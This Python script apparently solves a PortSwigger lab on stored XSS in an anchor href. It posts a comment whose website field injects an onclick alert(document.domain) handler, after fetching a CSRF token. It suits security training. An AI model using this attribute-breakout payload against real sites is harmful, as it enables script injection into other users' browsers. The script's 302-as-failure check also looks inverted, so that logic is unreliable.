#!/usr/bin/env python3
# Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
# Lab-Link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def main():
    print('[+] Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = f'{host}/post/comment'
    data = {
        'csrf': get_csrf_token(client, f'{host}/post?postId=1'),
        'postId': '1',
        'comment': 'This is a comment',
        'name': 'Name',
        'email': 'invalid@example.com',
        'website': 'http://www.example.com" onclick="alert(document.domain)'
    }
    if client.post(url, data=data).status_code == 302:
        print(f'[-] Something appeared to be wrong posting the comment')

    if 'Congratulations, you solved the lab!' not in client.get(f'{host}/post?postId=1').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
